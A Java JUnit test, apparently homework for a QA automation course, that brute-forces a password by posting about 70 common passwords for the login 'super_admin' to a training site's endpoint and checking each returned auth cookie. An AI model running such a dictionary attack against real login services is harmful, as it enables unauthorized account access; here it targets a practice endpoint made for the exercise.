package dz;

import io.restassured.RestAssured;

import io.restassured.response.Response;

import org.junit.jupiter.api.Test;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;


public class Ex9 {

    @Test
    public void testPassword() throws InterruptedException {
        ArrayList<String> passwords = new ArrayList<>();
        passwords.add("1234567");
        passwords.add("123456");
        passwords.add("12345");
        passwords.add("1234");
        passwords.add("12345678");
        passwords.add("123456789");
        passwords.add("1234567890");
        passwords.add("password");
        passwords.add("qwerty");
        passwords.add ("abc123");
        passwords.add ("football");
        passwords.add ("monkey");
        passwords.add("111111");
        passwords.add("letmein");
        passwords.add("dragon");
        passwords.add("baseball");
        passwords.add("sunshine");
        passwords.add("iloveyou");
        passwords.add("trustno1");
        passwords.add("princess");
        passwords.add("adobe123");
        passwords.add("123123");
        passwords.add("welcome");
        passwords.add("login");
        passwords.add("admin");
        passwords.add("qwerty123");
        passwords.add("solo");
        passwords.add("1q2w3e4r");
        passwords.add("666666");
        passwords.add("master");
        passwords.add("photoshop");
        passwords.add("1qaz2wsx");
        passwords.add("qwertyuiop");
        passwords.add("ashley");
        passwords.add("mustang");
        passwords.add("121212");
        passwords.add("starwars");
        passwords.add("654321");
        passwords.add("bailey");
        passwords.add("access");
        passwords.add("flower");
        passwords.add("555555");
        passwords.add("shadow");
        passwords.add("passw0rd");
        passwords.add("lovely");
        passwords.add("7777777");
        passwords.add("michael");
        passwords.add("!@#$%^&*\t");
        passwords.add("jesus");
        passwords.add("password1");
        passwords.add("superman");
        passwords.add("hello");
        passwords.add("charlie");
        passwords.add("888888");
        passwords.add("696969");
        passwords.add("qwertyuiop");
        passwords.add("hottie");
        passwords.add("freedom");
        passwords.add("aa123456");
        passwords.add("qazwsx");
        passwords.add("ninja");
        passwords.add("azerty");
        passwords.add("loveme");
        passwords.add("whatever");
        passwords.add("donald");
        passwords.add("batman");
        passwords.add("zaq1zaq1");
        passwords.add("Football");
        passwords.add("000000");
        passwords.add("123qwe");

        for (int i = 0; i < passwords.size(); i++) {
            String password = passwords.get(i);
            Map<String, String> params = new HashMap<>();
            params.put("login", "super_admin");
            params.put("password", password);
            Response response1 = RestAssured
                    .given()
                    .body(params)
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();
            String cookie = response1.getCookie("auth_cookie");

            Map<String, String> cookies = new HashMap<>();
            cookies.put("auth_cookie", cookie);

            Response response2 = RestAssured
                    .given()
                    .body(params)
                    .cookies(cookies)
                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();
            String answer = response2.asString();

            if (!answer.equals("You are NOT authorized")) {
                System.out.println(answer);
                System.out.println(password);
                break;
            }
        }


    }
}

